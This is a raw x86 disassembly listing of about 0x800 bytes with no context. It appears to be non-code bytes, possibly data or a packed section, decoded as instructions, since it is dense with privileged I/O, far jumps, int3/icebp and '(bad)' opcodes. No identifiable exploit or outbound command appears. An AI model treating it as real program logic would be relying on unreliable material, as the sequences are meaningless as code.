  43059e:	fucom  st(0)
  4305a0:	test   eax,0x1d95312a
  4305a5:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4305a7:	add    DWORD PTR [edi],esp
  4305a9:	push   ebp
  4305aa:	icebp  
  4305ab:	mov    WORD PTR [ebp-0x41],ds
  4305ae:	mov    dh,0xca
  4305b0:	and    edx,DWORD PTR [edi+0x74]
  4305b3:	dec    edi
  4305b4:	sbb    DWORD PTR [ebx],ebx
  4305b6:	xchg   ebp,eax
  4305b7:	cmp    BYTE PTR [esi],dl
  4305b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4305ba:	shr    DWORD PTR [edi],1
  4305bc:	jno    0x4305a5
  4305be:	(bad)  
  4305bf:	adc    BYTE PTR [ecx-0x326e1061],ah
  4305c5:	pop    ss
  4305c6:	in     eax,0x1c
  4305c8:	aas    
  4305c9:	test   DWORD PTR [edi-0x3ad5b501],esi
  4305cf:	sub    al,0x96
  4305d1:	pushf  
  4305d2:	or     ebx,DWORD PTR [ebx+0x78]
  4305d5:	add    edi,DWORD PTR [ecx-0x46cb0ed]
  4305db:	in     eax,0xa3
  4305dd:	inc    esp
  4305de:	mov    dh,0x5a
  4305e0:	dec    eax
  4305e1:	into   
  4305e2:	mov    bh,0xd5
  4305e4:	xchg   DWORD PTR [edi+0x2c],esp
  4305e7:	or     al,0x67
  4305e9:	or     BYTE PTR [esi-0x1e098dce],ch
  4305ef:	cmp    dh,cl
  4305f1:	data16 fwait
  4305f3:	enter  0x5558,0x20
  4305f7:	mov    edi,0xcc386b11
  4305fc:	fidiv  DWORD PTR [edi-0x21874e49]
  430602:	dec    edi
  430603:	icebp  
  430604:	lock pop ecx
  430606:	ftst   
  430608:	and    eax,0x7a6ee1a2
  43060d:	test   DWORD PTR [edx+0x16],edx
  430610:	mov    bh,0xaf
  430612:	and    eax,0x3aa158b1
  430617:	adc    esp,DWORD PTR [ecx-0x2e775fb7]
  43061d:	ins    DWORD PTR es:[edi],dx
  43061e:	es xor ecx,edx
  430621:	inc    esi
  430622:	jmp    0x4305ba
  430624:	in     eax,dx
  430625:	mov    esi,gs
  430627:	dec    ah
  430629:	jb     0x4305ea
  43062b:	cmp    BYTE PTR [edx-0x35],0x77
  43062f:	mov    ds:0x43f49e81,eax
  430634:	xchg   esp,eax
  430635:	xchg   esi,eax
  430636:	in     al,dx
  430637:	bound  ebp,QWORD PTR [eax-0x1d]
  43063a:	xchg   esp,eax
  43063b:	push   cs
  43063c:	sbb    al,0x81
  43063e:	dec    edi
  43063f:	jg     0x4305d0
  430641:	leave  
  430642:	jl     0x4305d9
  430644:	mov    ?,WORD PTR [esi+0x7ea7ce00]
  43064a:	int3   
  43064b:	fsubr  QWORD PTR [ebx+0x2f]
  43064e:	xlat   BYTE PTR ds:[ebx]
  43064f:	push   ebx
  430650:	aam    0x6d
  430652:	sub    eax,0x43c76493
  430657:	mov    ah,0x6d
  430659:	out    dx,eax
  43065a:	adc    al,0x4a
  43065c:	pop    ecx
  43065d:	arpl   sp,bp
  43065f:	mov    ecx,0x7bfde223
  430664:	mov    al,0x36
  430666:	jnp    0x430601
  430668:	jl     0x430666
  43066a:	and    ch,bh
  43066c:	mov    bh,0x6e
  43066e:	mov    ds:0xecce38b4,eax
  430673:	jo     0x43067a
  430675:	fwait
  430676:	retf   
  430677:	mov    ch,al
  430679:	(bad)  [esi+eax*2]
  43067c:	pop    esp
  43067d:	(bad)  
  43067f:	pop    esp
  430680:	(bad)  
  430681:	pusha  
  430682:	xor    esi,edx
  430684:	mov    ecx,eax
  430686:	es pop edi
  430688:	sbb    dl,BYTE PTR [ebp-0x65599719]
  43068e:	stos   DWORD PTR es:[edi],eax
  43068f:	(bad)  
  430690:	(bad)
  430694:	cmp    al,0x5d
  430696:	jnp    0x430694
  430698:	les    ebx,FWORD PTR [edi]
  43069a:	pop    ss
  43069b:	cmp    edi,edi
  43069d:	aam    0x7f
  43069f:	repnz mov BYTE PTR [ecx+0xb],dh
  4306a3:	mov    bh,0x96
  4306a5:	xchg   ecx,ecx
  4306a7:	and    al,0x13
  4306a9:	aam    0x62
  4306ab:	aas    
  4306ac:	popa   
  4306ad:	jbe    0x4306ae
  4306af:	adc    bh,BYTE PTR [ebp+0x43037d77]
  4306b5:	sub    ah,BYTE PTR [ecx]
  4306b7:	push   0xccf29fa9
  4306bc:	adc    cl,ch
  4306be:	xlat   BYTE PTR ds:[ebx]
  4306bf:	mov    ebp,0x1746679b
  4306c4:	jmp    0x53ba:0x37527b46
  4306cb:	cli    
  4306cc:	mov    esi,0xca8db8ab
  4306d1:	aam    0x54
  4306d3:	cmp    eax,0x5703541d
  4306d8:	xor    eax,0x7115440c
  4306dd:	test   eax,0x19950efc
  4306e2:	pop    eax
  4306e3:	pop    DWORD PTR [ecx]
  4306e5:	push   0x69b54014
  4306ea:	push   edx
  4306eb:	or     DWORD PTR [ebx],esp
  4306ed:	dec    edx
  4306ee:	mov    cl,0x59
  4306f0:	add    DWORD PTR ds:0x688e1656,esp
  4306f6:	pop    ss
  4306f7:	push   esp
  4306f8:	out    0xa8,eax
  4306fa:	cmp    DWORD PTR [edx],ebx
  4306fc:	jmp    0x588ff1a0
  430701:	sub    DWORD PTR [edi-0x68],edi
  430704:	inc    esi
  430705:	xchg   edi,eax
  430706:	popf   
  430707:	es std 
  430709:	jnp    0x4306aa
  43070b:	shr    dh,0xf0
  43070e:	cmp    ebp,DWORD PTR [esi-0x444e03de]
  430714:	sub    DWORD PTR ds:0xf03f98c4,ebp
  43071a:	jae    0x430768
  43071c:	lods   eax,DWORD PTR ds:[esi]
  43071d:	xchg   edi,eax
  43071e:	pusha  
  43071f:	imul   ebx,DWORD PTR [edx-0x3b],0xc0b8f4c2
  430726:	jmp    0x2e0e5f60
  43072b:	loop   0x43075a
  43072d:	dec    esi
  43072e:	xor    bh,BYTE PTR [edi]
  430730:	jb     0x43074a
  430732:	mov    ebx,0xb9bf044d
  430737:	dec    edx
  430738:	cmp    DWORD PTR ds:0x165dca2b,esi
  43073e:	or     esp,DWORD PTR gs:[ecx+0x6eb4c185]
  430745:	inc    ebx
  430746:	loope  0x430773
  430748:	aas    
  430749:	enter  0xa9d2,0xff
  43074d:	push   ss
  43074e:	dec    ebx
  43074f:	pop    ebx
  430750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430751:	sub    bl,BYTE PTR [esi]
  430753:	xor    bh,BYTE PTR [esi]
  430755:	xchg   ecx,eax
  430756:	adc    al,ch
  430758:	and    al,0xca
  43075a:	xchg   edi,eax
  43075b:	scas   eax,DWORD PTR es:[edi]
  43075c:	sar    BYTE PTR [ecx],1
  43075e:	mov    eax,0x5badbc95
  430763:	add    al,0x20
  430765:	iret   
  430766:	shl    BYTE PTR [esi+0x4f1b301b],0x50
  43076d:	cwde   
  43076e:	pop    ds
  43076f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430770:	push   0xa
  430772:	popa   
  430773:	ja     0x43072b
  430775:	push   eax
  430776:	sub    al,0x5d
  430778:	pushf  
  430779:	gs test al,0xfd
  43077c:	ja     0x43075f
  43077e:	ror    BYTE PTR [edi-0x46c8c270],cl
  430784:	jl     0x4307e2
  430786:	or     WORD PTR [edx+0x1f7c3359],di
  43078d:	push   ss
  43078e:	dec    ebx
  43078f:	cmp    eax,DWORD PTR [ebp-0x740cf36f]
  430795:	out    dx,eax
  430796:	ret    0xd9e6
  430799:	inc    edx
  43079a:	xlat   BYTE PTR ds:[ebx]
  43079b:	fisubr DWORD PTR [ebx-0x440a81e7]
  4307a1:	int3   
  4307a2:	push   ds
  4307a3:	jae    0x430808
  4307a5:	mov    BYTE PTR [eax+eiz*2-0xf11326d],dh
  4307ac:	mov    ch,BYTE PTR [ecx-0x24]
  4307af:	in     al,0xa1
  4307b1:	sub    BYTE PTR [ebx],ch
  4307b3:	fwait
  4307b4:	(bad)
  4307b8:	inc    BYTE PTR [esi-0x4e]
  4307bb:	and    eax,edi
  4307bd:	lds    edi,FWORD PTR [eax-0x78]
  4307c0:	inc    edi
  4307c1:	adc    eax,0xf6ff1174
  4307c6:	mov    edi,0x4e171e32
  4307cb:	jg     0x430758
  4307cd:	adc    esi,0x478a469d
  4307d3:	lds    esp,FWORD PTR [eax+0x7a640b55]
  4307d9:	fiadd  WORD PTR [ebp-0x52]
  4307dc:	mov    bl,0xd
  4307de:	ret    
  4307df:	jmp    0xfb97d15f
  4307e4:	dec    eax
  4307e5:	adc    eax,0xb42de2ed
  4307ea:	mov    cl,BYTE PTR [eax-0x61]
  4307ed:	or     BYTE PTR [eax-0x2944a8f5],dl
  4307f3:	adc    ch,BYTE PTR [ebx-0x30592cb6]
  4307f9:	loopne 0x43082b
  4307fb:	mov    bh,0xd7
  4307fd:	xchg   ebx,eax
  4307fe:	dec    ebx
  4307ff:	int3   
  430800:	fistp  QWORD PTR [edx+ecx*4-0x3c662003]
  430807:	cwde   
  430808:	ins    DWORD PTR es:[edi],dx
  430809:	xor    al,0x39
  43080b:	rcl    DWORD PTR [ebp+esi*2-0x4326397e],1
  430812:	call   0x5033:0x2340348a
  430819:	mov    ch,0xd
  43081b:	push   ebx
  43081c:	adc    eax,0xb98d2b9f
  430821:	dec    edx
  430822:	jmp    0x8b04f17c
  430827:	sub    dl,ah
  430829:	je     0x4307cf
  43082b:	mov    al,ds:0x6904e9ba
  430830:	push   esp
  430831:	cld    
  430832:	cmp    DWORD PTR [ecx-0x6c],ebp
  430835:	adc    BYTE PTR [ebx-0x2012e03c],ch
  43083b:	push   esp
  43083c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43083d:	fs in  eax,dx
  43083f:	fdivp  st(5),st
  430841:	mov    bh,0xae
  430843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430844:	in     eax,0xeb
  430846:	sbb    eax,0xb462bd98
  43084b:	lds    esi,FWORD PTR [eax+0x751d42d9]
  430851:	cmovg  edx,esi
  430854:	mov    ecx,esp
  430856:	cld    
  430857:	mov    ah,0x40
  430859:	jmp    0x1191:0xaf93e249
  430860:	cld    
  430861:	imul   ebp,edi,0xf508e370
  430867:	xchg   edx,eax
  430868:	dec    ecx
  430869:	in     al,0x48
  43086b:	lahf   
  43086c:	dec    ebp
  43086d:	mov    bh,ch
  43086f:	jbe    0x430801
  430871:	sahf   
  430872:	retf   0xe9e1
  430875:	adc    DWORD PTR [esp+edx*1+0x30],esi
  430879:	xor    DWORD PTR [ecx+0x18],edi
  43087c:	cs stc 
  43087e:	sbb    edi,DWORD PTR [edi]
  430880:	test   eax,0x9dd0585c
  430885:	enter  0x7cd8,0x9a
  430889:	es inc edi
  43088b:	mov    dh,0x1e
  43088d:	inc    ecx
  43088e:	scas   eax,DWORD PTR es:[edi]
  43088f:	je     0x430896
  430891:	cmp    ebx,edi
  430893:	inc    edx
  430894:	adc    al,0xb7
  430896:	iret   
  430897:	xchg   BYTE PTR [ebx+0x5a314dcf],bh
  43089d:	mov    al,ds:0x53f792fd
  4308a2:	pop    eax
  4308a3:	cmp    bh,cl
  4308a5:	in     al,dx
  4308a6:	sahf   
  4308a7:	iret   
  4308a8:	cs psllq mm2,mm4
  4308ac:	fisubr WORD PTR [edi+0x73]
  4308af:	cmc    
  4308b0:	or     al,0x99
  4308b2:	cdq    
  4308b3:	push   ebx
  4308b4:	push   esp
  4308b5:	xor    ah,BYTE PTR [esi]
  4308b7:	push   0x5a
  4308b9:	(bad)  
  4308bb:	out    0xfe,eax
  4308bd:	nop    DWORD PTR [ebp+ecx*1-0x79]
  4308c2:	cmp    BYTE PTR [ecx],ah
  4308c4:	fld    TBYTE PTR [edi+0x5d6d487f]
  4308ca:	jnp    0xd40af717
  4308d0:	outs   dx,BYTE PTR ds:[esi]
  4308d1:	adc    edx,DWORD PTR [ecx+ebx*2-0x2a6d9455]
  4308d8:	ins    DWORD PTR es:[edi],dx
  4308d9:	gs out 0xf4,al
  4308dc:	adc    al,0xe5
  4308de:	mov    esp,0xec1edd76
  4308e3:	dec    ebp
  4308e4:	add    DWORD PTR [esi+0x79119df6],esp
  4308ea:	xor    BYTE PTR [ebx-0x119eb6e1],dl
  4308f0:	cmc    
  4308f1:	popa   
  4308f2:	mov    cl,0xb9
  4308f4:	xor    edx,ebx
  4308f6:	lods   al,BYTE PTR ds:[esi]
  4308f7:	inc    edx
  4308f8:	sub    ebp,DWORD PTR [edx+0x19abc7b2]
  4308fe:	jge    0x4308e6
  430900:	adc    eax,0x445d3a9a
  430905:	into   
  430906:	int3   
  430907:	arpl   WORD PTR [ebp-0x2772fa67],si
  43090d:	mov    BYTE PTR [esp+ebx*4],bl
  430910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430911:	arpl   WORD PTR [edi+0x27],si
  430914:	inc    BYTE PTR [ecx]
  430916:	sub    edi,DWORD PTR [esi-0x4d9cd062]
  43091c:	cmp    DWORD PTR [ecx+0x34],ebx
  43091f:	lods   al,BYTE PTR ds:[esi]
  430920:	ret    0x7b9f
  430923:	test   eax,ecx
  430925:	jl     0x4308c3
  430927:	int3   
  430928:	or     ebx,edi
  43092a:	shl    esp,0xf
  43092d:	shl    dh,cl
  43092f:	(bad)  
  430930:	iret   
  430931:	arpl   WORD PTR [eax+0x5a],cx
  430934:	sub    DWORD PTR [ebp-0x62],ecx
  430937:	mov    ds:0x672ce07a,eax
  43093c:	aas    
  43093d:	cld    
  43093e:	or     eax,0xcb6b570e
  430943:	popf   
  430944:	jle    0x4309b8
  430946:	xor    al,0x46
  430948:	ret    
  430949:	lds    ebp,FWORD PTR [eax-0x5c]
  43094c:	imul   DWORD PTR [edx+0x1a45cda9]
  430952:	int    0x5f
  430954:	aad    0x28
  430956:	cmp    al,0x4d
  430958:	push   es
  430959:	jl     0x430986
  43095b:	adc    BYTE PTR [edi-0x28af0216],bl
  430961:	jnp    0x430912
  430963:	sahf   
  430964:	or     DWORD PTR [eax+0x75661e06],ebp
  43096a:	mov    eax,ds:0x14c43d50
  43096f:	fsubr  QWORD PTR [edi]
  430971:	shr    al,1
  430973:	pushf  
  430974:	stos   DWORD PTR es:[edi],eax
  430975:	out    0xeb,al
  430977:	pop    ecx
  430978:	imul   esi,DWORD PTR [ecx+edx*4+0x5402ea2e],0x4b56d1a5
  430983:	jno    0x4309d3
  430985:	lahf   
  430986:	cs fs inc ecx
  430989:	sbb    cl,BYTE PTR [ebp-0x1100f8ba]
  43098f:	sub    eax,0x63e0feb4
  430994:	xchg   esp,eax
  430995:	addr16 out 0x89,eax
  430998:	push   ds
  430999:	jle    0x430933
  43099b:	pushf  
  43099c:	lods   eax,DWORD PTR ds:[esi]
  43099d:	test   DWORD PTR [ebp+edi*4-0x41682a7b],ebp
  4309a4:	fwait
  4309a5:	call   0xc5d715a6
  4309aa:	retf   0x845b
  4309ad:	retf   
  4309ae:	xchg   ebp,eax
  4309af:	adc    ah,BYTE PTR [ebx-0x1ad80e1e]
  4309b5:	ficomp WORD PTR [edx+0x49]
  4309b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309b9:	add    edi,DWORD PTR [ebx+0x70]
  4309bc:	lods   eax,DWORD PTR ds:[esi]
  4309bd:	pop    eax
  4309be:	shl    DWORD PTR [ecx-0x6e],cl
  4309c1:	push   ebx
  4309c2:	xor    edi,eax
  4309c4:	mov    bh,0xbc
  4309c6:	sub    eax,0xfffffff4
  4309c9:	inc    ecx
  4309ca:	mov    dh,BYTE PTR [ecx+0x33505951]
  4309d0:	add    edx,DWORD PTR [edi+0x6c7e32b7]
  4309d6:	xchg   ecx,eax
  4309d7:	jmp    0xd840367d
  4309dc:	fcom   QWORD PTR [edi+ebp*8-0x5b]
  4309e0:	sahf   
  4309e1:	mov    esi,ecx
  4309e3:	xor    al,bh
  4309e5:	sar    BYTE PTR [edi+0x41d53d51],cl
  4309eb:	(bad)  
  4309ec:	imul   ecx,DWORD PTR [edi],0x50
  4309ef:	xchg   ecx,eax
  4309f0:	test   DWORD PTR [edi-0x37e7625f],ebp
  4309f6:	mov    BYTE PTR [edi],0xc5
  4309f9:	push   edi
  4309fa:	sbb    DWORD PTR [esp+ecx*4],ecx
  4309fd:	pop    edi
  4309fe:	cmc    
  4309ff:	dec    ecx
  430a00:	icebp  
  430a01:	dec    eax
  430a02:	and    esi,DWORD PTR [ebp-0x7f]
  430a05:	push   esi
  430a06:	lods   eax,DWORD PTR ds:[esi]
  430a07:	mov    eax,0xc67f6206
  430a0c:	push   0x6c970af2
  430a11:	data16 clc 
  430a13:	mov    DWORD PTR [ebx],edi
  430a15:	push   0xc8c3581d
  430a1a:	mov    eax,ds:0xae66d883
  430a1f:	daa    
  430a20:	xor    eax,0x7b654a3b
  430a25:	nop
  430a26:	ins    DWORD PTR es:[edi],dx
  430a27:	cmp    ebx,ebp
  430a29:	push   esp
  430a2a:	xchg   esi,eax
  430a2b:	push   ss
  430a2c:	sub    BYTE PTR [eax],bl
  430a2e:	inc    ebp
  430a2f:	cwde   
  430a30:	(bad)  
  430a31:	xor    edi,DWORD PTR [eax]
  430a33:	fist   DWORD PTR [edi-0x2d]
  430a36:	sub    al,0x46
  430a38:	(bad)  
  430a3a:	mov    edi,ebx
  430a3c:	pusha  
  430a3d:	mov    ch,0xdb
  430a3f:	or     ch,ch
  430a41:	sbb    al,0xa0
  430a43:	pushf  
  430a44:	cmp    eax,0xa275d185
  430a49:	fisubr WORD PTR ds:0x61ce6ed9
  430a4f:	cmp    BYTE PTR [ecx+0x25],dl
  430a52:	call   0x6c023c5f
  430a57:	and    edx,esi
  430a59:	mov    DWORD PTR [edi],edx
  430a5b:	cdq    
  430a5c:	fldcw  WORD PTR [edi]
  430a5e:	fdivr  st(5),st
  430a60:	mov    dh,0x55
  430a62:	in     al,0xa2
  430a64:	push   esi
  430a65:	cld    
  430a66:	fstp   QWORD PTR [esi-0x47]
  430a69:	mov    edi,0x8890c5b
  430a6e:	jae    0x430a27
  430a70:	xchg   DWORD PTR [ebp+0x3d4d38c5],esp
  430a76:	pop    ebp
  430a77:	fadd   DWORD PTR [edx]
  430a79:	lahf   
  430a7a:	shr    cl,0x14
  430a7d:	and    ecx,eax
  430a7f:	jns    0x430a4f
  430a81:	cwde   
  430a82:	fiadd  WORD PTR [eax+0x59]
  430a85:	jbe    0x430af7
  430a87:	test   al,0x72
  430a89:	push   ecx
  430a8a:	or     BYTE PTR [esp+ebp*1],dl
  430a8d:	dec    esp
  430a8e:	shr    BYTE PTR [eax],cl
  430a90:	std    
  430a91:	push   ebp
  430a92:	test   eax,0xe84a1a9e
  430a97:	pop    esp
  430a98:	loope  0x430a9b
  430a9a:	and    edi,DWORD PTR [edx+0x7beb0871]
  430aa0:	fsubr  QWORD PTR [edi+edi*8+0x4421581e]
  430aa7:	stos   BYTE PTR es:[edi],al
  430aa8:	sub    edx,DWORD PTR [ecx-0x5e0b397d]
  430aae:	ds jge 0x430ae0
  430ab1:	out    0x68,eax
  430ab3:	push   eax
  430ab4:	cmp    al,0x15
  430ab6:	push   esp
  430ab7:	push   edx
  430ab8:	mov    DWORD PTR [edi-0x1508c126],0x3367dfca
  430ac2:	shl    ebx,1
  430ac4:	rcr    DWORD PTR [ebp+0x53b4f6d8],cl
  430aca:	dec    esi
  430acb:	retf   0x877b
  430ace:	cli    
  430acf:	les    eax,FWORD PTR [eax+0x3f9f9335]
  430ad5:	dec    edi
  430ad6:	icebp  
  430ad7:	pushf  
  430ad8:	cwde   
  430ad9:	test   eax,0x72d34293
  430ade:	sub    DWORD PTR [edx],esi
  430ae0:	mov    eax,ds:0x411f78a2
  430ae5:	and    BYTE PTR [edx+0x20],0xd
  430ae9:	and    DWORD PTR [edi-0x42832140],edx
  430aef:	sub    eax,0x87ab7856
  430af4:	xchg   ecx,eax
  430af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430af6:	xor    ch,BYTE PTR [ecx+edi*4+0x3a989bd]
  430afd:	sub    ecx,edi
  430aff:	jnp    0x430aa2
  430b01:	ja     0x430ac0
  430b03:	fisttp QWORD PTR [edi+edi*1]
  430b06:	aaa    
  430b07:	dec    edx
  430b08:	sti    
  430b09:	scas   al,BYTE PTR es:[edi]
  430b0a:	outs   dx,BYTE PTR ds:[esi]
  430b0b:	inc    ecx
  430b0c:	pop    eax
  430b0d:	gs pop edx
  430b0f:	push   edi
  430b10:	xor    eax,0x4a647731
  430b15:	push   eax
  430b16:	push   esp
  430b17:	cmp    esi,DWORD PTR [ebx]
  430b19:	out    0x84,eax
  430b1b:	addr16 pop edi
  430b1d:	fild   QWORD PTR [ebx]
  430b1f:	je     0x430ac2
  430b21:	xchg   ebx,eax
  430b22:	hlt    
  430b23:	mov    al,0x28
  430b25:	(bad)  
  430b27:	out    dx,eax
  430b28:	adc    DWORD PTR [edx],ebx
  430b2a:	mov    ch,0xc0
  430b2c:	clc    
  430b2d:	(bad)  
  430b2e:	mov    bh,0x2c
  430b30:	out    dx,eax
  430b31:	test   eax,0x853daef6
  430b36:	adc    ebp,DWORD PTR [esp+edi*4]
  430b39:	repnz adc dh,bl
  430b3c:	aad    0x7b
  430b3e:	sub    ch,cl
  430b40:	(bad)  
  430b41:	dec    eax
  430b42:	mov    esp,0x8ac86ff3
  430b47:	shl    DWORD PTR [ecx],1
  430b49:	(bad)  
  430b4a:	or     al,0x74
  430b4c:	sbb    al,0x7b
  430b4e:	inc    ecx
  430b4f:	js     0x430b4c
  430b51:	adc    DWORD PTR [ecx+0x1e],esi
  430b54:	inc    edi
  430b55:	in     al,0x7e
  430b57:	in     eax,0xfa
  430b59:	cdq    
  430b5a:	mov    ebp,0x8627d9a3
  430b5f:	push   0xd0aaa849
  430b64:	add    edi,DWORD PTR [ecx-0x37]
  430b67:	lock out 0x35,al
  430b6a:	inc    edx
  430b6b:	ror    DWORD PTR [edx-0x73874274],cl
  430b71:	xchg   esi,eax
  430b72:	xor    eax,0xd21542bd
  430b77:	bound  eax,QWORD PTR [eax]
  430b79:	pop    esp
  430b7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b7b:	pop    edi
  430b7c:	sahf   
  430b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430b7e:	jmp    0xc58d7a55
  430b83:	sub    ch,BYTE PTR ds:0x7d31b6eb
  430b89:	loop   0x430b93
  430b8b:	mov    esi,0x70b1316
  430b90:	into   
  430b91:	aam    0xeb
  430b93:	cmp    BYTE PTR [edx-0x1b9c9151],bh
  430b99:	mov    DWORD PTR [ecx],ebp
  430b9b:	call   0x417c:0x10485d6
  430ba2:	adc    BYTE PTR [ebx+0x7],al
  430ba5:	sti    
  430ba6:	mov    WORD PTR ds:0x14dc4575,ds
  430bac:	sti    
  430bad:	adc    edi,DWORD PTR [ecx+0x1fc8884c]
  430bb3:	aas    
  430bb4:	dec    edi
  430bb5:	out    dx,eax
  430bb6:	daa    
  430bb7:	mov    edi,0x2ad7c825
  430bbc:	iret   
  430bbd:	imul   edx,DWORD PTR [ebx+0x646458b5],0xfffffff3
  430bc4:	ins    DWORD PTR es:[edi],dx
  430bc5:	sbb    al,0xcb
  430bc7:	adc    eax,0xa9fc6797
  430bcc:	lock imul edi,DWORD PTR ss:[ebp-0x3],0x7b0c6847
  430bd5:	push   ebp
  430bd6:	or     ch,BYTE PTR [ebp+0x1eaa6066]
  430bdc:	push   cs
  430bdd:	shr    al,1
  430bdf:	add    edx,DWORD PTR [ecx+0x2b09d1a1]
  430be5:	mov    al,ds:0x15deb35f
  430bea:	pop    eax
  430beb:	mov    ch,0xb9
  430bed:	push   edx
  430bee:	in     eax,dx
  430bef:	mov    al,ds:0x95bd414
  430bf4:	or     edx,DWORD PTR [ebp+0x43]
  430bf7:	inc    ecx
  430bf8:	stos   DWORD PTR es:[edi],eax
  430bf9:	cs push 0xfb4858aa
  430bff:	fwait
  430c00:	add    eax,0xa8a1bafe
  430c05:	jmp    0x44df:0x3fd3ebac
  430c0c:	and    ecx,DWORD PTR [ecx+0xcdf43a4]
  430c12:	in     eax,dx
  430c13:	sti    
  430c14:	jmp    0x1fb3:0xf8475ebb
  430c1b:	sar    DWORD PTR [edx-0x1596b22a],0x41
  430c22:	retf   0xef4d
  430c25:	adc    DWORD PTR [ebx],ecx
  430c27:	fcmovnb st,st(3)
  430c29:	clc    
  430c2a:	imul   edi,DWORD PTR [edi+0x18149faa],0x1d
  430c31:	cs into 
  430c33:	(bad)  
  430c34:	stc    
  430c35:	pop    edi
  430c36:	xor    BYTE PTR [esp+eax*2],dl
  430c39:	imul   edi,esp,0x18677ae6
  430c3f:	addr16 iret 
  430c41:	inc    esi
  430c42:	sbb    al,0xde
  430c44:	inc    ebp
  430c45:	xchg   edx,eax
  430c46:	xchg   ebx,eax
  430c47:	or     ebx,DWORD PTR [eax+0x2f08769a]
  430c4d:	ss loop 0x430c5b
  430c50:	pushf  
  430c51:	and    eax,0x97aae3d8
  430c56:	and    DWORD PTR [edi-0x4c9dfadd],esp
  430c5c:	gs mov dl,0xd5
  430c5f:	and    BYTE PTR [ecx],al
  430c61:	in     eax,dx
  430c62:	clc    
  430c63:	inc    ebp
  430c64:	jl     0x430ccb
  430c66:	jmp    0x47bb4057
  430c6b:	jb     0x430c1f
  430c6d:	mov    cl,0x9f
  430c6f:	arpl   WORD PTR [ecx+0x6d],sp
  430c72:	dec    ebp
  430c73:	mov    esp,0x7c991cf3
  430c78:	push   edx
  430c79:	test   al,0xc5
  430c7b:	sti    
  430c7c:	jmp    0x430ccd
  430c7e:	xor    eax,0x93dfdb75
  430c83:	jge    0x430c76
  430c85:	clc    
  430c86:	jb     0x430c41
  430c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430c89:	imul   BYTE PTR [esi+0x15ee66ab]
  430c8f:	fcomp  st(5)
  430c91:	sub    DWORD PTR [eax],esp
  430c93:	mov    eax,ds:0xde8f5395
  430c98:	dec    ecx
  430c99:	mov    cl,0x6c
  430c9b:	pop    ss
  430c9c:	mov    esi,0x1ed02257
  430ca1:	and    al,0x3d
  430ca3:	imul   DWORD PTR [edx]
  430ca5:	es mov ebx,0x8d970e83
  430cab:	call   0x6a8d:0xbcf89bab
  430cb2:	rol    DWORD PTR [esi-0x49d2904b],0x7c
  430cb9:	cdq    
  430cba:	int3   
  430cbb:	les    ecx,FWORD PTR [eax]
  430cbd:	jmp    0x2299b3e
  430cc2:	mov    esp,DWORD PTR [eax+0x539e349b]
  430cc8:	sti    
  430cc9:	leave  
  430cca:	cmc    
  430ccb:	or     dl,BYTE PTR [ebx+0x15]
  430cce:	dec    edi
  430ccf:	and    ecx,esp
  430cd1:	xor    al,0xb6
  430cd4:	dec    edi
  430cd5:	xchg   edx,eax
  430cd6:	lahf   
  430cd7:	cmp    eax,0x5f649e29
  430cdc:	cmp    eax,0xd8da11ae
  430ce1:	and    dl,bh
  430ce3:	hlt    
  430ce4:	leave  
  430ce5:	sbb    bh,BYTE PTR [edx-0x4f]
  430ce8:	retf   
  430ce9:	xor    eax,0x9f724363
  430cee:	add    DWORD PTR [ecx+0x29],eax
  430cf1:	(bad)  
  430cf2:	sub    al,BYTE PTR [esi]
  430cf4:	xchg   edi,eax
  430cf5:	jbe    0x430cab
  430cf7:	clc    
  430cf8:	imul   ebx,DWORD PTR [ecx-0x4],0x9bcd3c29
  430cff:	dec    ecx
  430d00:	sbb    edi,DWORD PTR [edx-0x67e40a67]
  430d06:	mov    dl,bh
  430d08:	jmp    0x2440:0xba63fe67
  430d0f:	je     0x430d56
  430d11:	push   edi
  430d12:	pop    ebp
  430d13:	(bad)  
  430d14:	push   esp
  430d15:	(bad)  [edi-0x4b]
  430d18:	outs   dx,DWORD PTR ds:[esi]
  430d19:	gs jge 0x430ce9
  430d1c:	arpl   WORD PTR [eax+eiz*8],si
  430d1f:	pop    edi
  430d20:	push   eax
  430d21:	fild   QWORD PTR [edi-0x1b]
  430d24:	icebp  
  430d25:	adc    eax,0x3bdf47a7
  430d2a:	mov    ds:0xb294186e,eax
  430d2f:	addr16 jne 0x430cf3
  430d32:	push   ecx
  430d33:	push   ecx
  430d34:	gs push ebp
  430d36:	aaa    
  430d37:	adc    dl,dl
  430d39:	sbb    eax,0xb8dd06c6
  430d3e:	lods   al,BYTE PTR ds:[esi]
  430d3f:	fistp  DWORD PTR [esp+eiz*4]
  430d42:	jmp    0x1507bc86
  430d47:	push   ss
  430d48:	xor    al,0x23
  430d4a:	je     0x430cf4
  430d4c:	push   0xffffffb6
  430d4e:	popa   
  430d4f:	stos   BYTE PTR es:[edi],al
  430d50:	cli    
  430d51:	test   eax,0xc6a826ce
  430d56:	jb     0x430d2c
  430d58:	mov    dl,0x5
  430d5a:	jb     0x430d41
  430d5c:	sub    BYTE PTR [ebx],cl
  430d5e:	out    0xe6,eax
  430d60:	mov    al,0x89
  430d62:	xchg   edi,eax
  430d63:	iret   
  430d64:	mov    DWORD PTR [ecx-0x2f327138],edx
  430d6a:	fsub   QWORD PTR [edi-0x59]
  430d6d:	adc    BYTE PTR ds:0x31b5e9e3,dh
  430d73:	cld    
  430d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430d75:	sbb    al,0x9d
  430d77:	aaa    
  430d78:	pop    esp
  430d79:	dec    esp
  430d7a:	ret    0x44ca
  430d7d:	lea    eax,[edi+esi*2]
  430d80:	outs   dx,DWORD PTR ds:[esi]
  430d81:	pusha  
  430d82:	out    dx,al
  430d83:	ret    0xde12
  430d86:	ss xchg ecx,eax
  430d88:	es icebp 
  430d8a:	(bad)  
  430d8b:	push   ss
  430d8c:	stos   DWORD PTR es:[edi],eax
  430d8d:	js     0x430d6f
  430d8f:	inc    esp
